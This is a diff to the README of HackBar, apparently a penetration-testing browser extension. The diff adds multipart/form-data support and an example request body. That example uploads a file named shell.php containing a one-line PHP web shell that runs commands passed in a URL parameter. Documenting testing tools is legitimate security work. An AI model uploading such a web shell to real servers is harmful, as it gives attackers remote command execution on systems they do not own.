@@ -12,6 +12,8 @@ Available on [Chrome Web Store](https://chrome.google.com/webstore/detail/hackba
 
 ## Features
 
+* Support GET and POST (including [multipart/form-data](#multipartform-data)) method.
+
 * SQLi
   * Dump tables from database
   * Dump columns from database
@@ -45,6 +47,27 @@ Available on [Chrome Web Store](https://chrome.google.com/webstore/detail/hackba
 | Load URL    | `Alt + A` | `Control + A` |
 | Split URL   | `Alt + S` | `Control + S` |
 | Execute URL | `Alt + X` | `Control + X` |
+
+## multipart/form-data
+
+After changing **enctype** field to ```multipart/form-data```, you can put your request payload into **Body** field such as the following:
+
+```
+------WebKitFormBoundarydbJBATDXCC6CL0lZ
+Content-Disposition: form-data; name="user"
+
+user
+------WebKitFormBoundarydbJBATDXCC6CL0lZ
+Content-Disposition: form-data; name="file"; filename="shell.php"
+Content-Type: application/x-httpd-php
+
+<?php passthru($_GET['c']); ?>
+------WebKitFormBoundarydbJBATDXCC6CL0lZ--
+```
+
+We will consider the first line as boundary, and reconstruct a form element to send your request.
+
+Therefore, sent boundary will not be the same as your typed.
 
 ## Third-party Libraries
 
